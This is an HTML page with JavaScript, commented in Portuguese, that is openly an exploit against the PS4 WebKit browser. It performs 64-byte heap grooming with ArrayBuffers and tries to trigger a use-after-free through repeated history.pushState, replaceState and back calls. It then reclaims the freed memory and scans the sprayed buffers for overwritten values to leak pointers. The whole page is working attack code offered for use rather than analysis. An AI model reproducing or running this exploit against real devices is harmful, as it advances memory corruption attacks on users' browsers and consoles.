<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - The Listener (Leak)</title>
<style>
    body { background-color: #000; color: #aaaaff; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #55f; background: #000033; color: #fff;
    }
    #log { border: 1px solid #335; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 400px; overflow-y: scroll;}
    .leak { background-color: #fff; color: #f00; font-size: 1.2em; font-weight: bold; border: 5px solid #f00; }
</style>
</head>
<body>
<h2>PS4 WebKit - Memory Leak Hunter (64 bytes)</h2>
<div id="status">Alvo: Capturar escrita do sistema...</div>
<button onclick="runLeakExploit()">INICIAR CAÇADA</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
let keepAlive = [];
let targetViews = []; // Aqui guardamos as "janelas" para a memória

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function runLeakExploit() {
    logEl.innerHTML = "";
    keepAlive = [];
    targetViews = [];
    statusEl.innerText = "Preparando armadilhas...";

    // 1. Preparação (Grooming com 64 bytes)
    // Criamos buffers e guardamos referências para suas views (Uint32Array)
    // Assim podemos ler o conteúdo deles depois do UAF
    log("1. Espalhando 5000 armadilhas de 64 bytes...");
    
    for(let i=0; i<5000; i++) {
        let buf = new ArrayBuffer(64);
        let view = new Uint32Array(buf);
        view.fill(0x41414141); // Enche com 'AAAA'
        
        // Guardamos para impedir GC e para checar depois
        keepAlive.push(buf);
        
        // A cada 2, guardamos a view para verificação rápida (otimização)
        if(i % 2 === 0) targetViews.push(view);
    }
    
    // Swiss Cheese (Buracos)
    // Liberamos alguns para o UAF cair no meio
    let holes = [];
    for(let i=0; i<keepAlive.length; i+=10) {
        keepAlive[i] = null; // Libera
    }
    
    // Força GC leve
    new ArrayBuffer(1024 * 1024);

    // 2. Trigger UAF
    log("2. Disparando UAF (Loop 48)...");
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        if (i === 47) {
            // MOMENTO CRÍTICO
            setTimeout(() => history.back(), 0);
            
            // Spray final para ocupar o lugar do UAF
            log(">>> RECLAIMING <<<");
            for(let k=0; k<1000; k++) {
                let buf = new ArrayBuffer(64);
                let view = new Uint32Array(buf);
                view.fill(0x41414141);
                targetViews.push(view); // Adiciona à lista de checagem
                keepAlive.push(buf);
            }
        }
        size += STEP;
        await sleep(5);
    }
    
    await sleep(200);
    
    // 3. A Varredura (Scan)
    log("3. Analisando armadilhas por alterações...");
    checkTraps();
}

function checkTraps() {
    let found = false;
    let leakedData = [];
    
    // Varre todas as nossas views.
    // Se o UAF funcionou, o navegador escreveu algo (provavelmente um ponteiro ou contador)
    // dentro de um dos nossos buffers, sobrescrevendo os 'AAAA'.
    
    for(let i=0; i < targetViews.length; i++) {
        let view = targetViews[i];
        
        // Checa apenas o início (onde headers costumam ser escritos)
        if(view[0] !== 0x41414141 || view[1] !== 0x41414141) {
            found = true;
            log(`!!! DETECTADO !!! Buffer #${i} foi modificado!`);
            
            // Captura o dump
            let hex0 = "0x" + view[0].toString(16).padStart(8,'0');
            let hex1 = "0x" + view[1].toString(16).padStart(8,'0');
            let hex2 = "0x" + view[2].toString(16).padStart(8,'0');
            let hex3 = "0x" + view[3].toString(16).padStart(8,'0');
            
            log(`Dados: ${hex0} ${hex1} ${hex2} ${hex3}`);
            leakedData.push({idx: i, data: [hex0, hex1]});
            
            // Paramos no primeiro leak sólido
            statusEl.className = "leak";
            statusEl.innerText = `LEAK CONFIRMADO: ${hex0}`;
            break; 
        }
    }
    
    if(!found) {
        log("Falha: Nenhum buffer foi tocado. Todos ainda são 'AAAA'.");
        log("Dica: Tente clicar novamente. A persistência é chave.");
    }
}
</script>
</body>
</html>
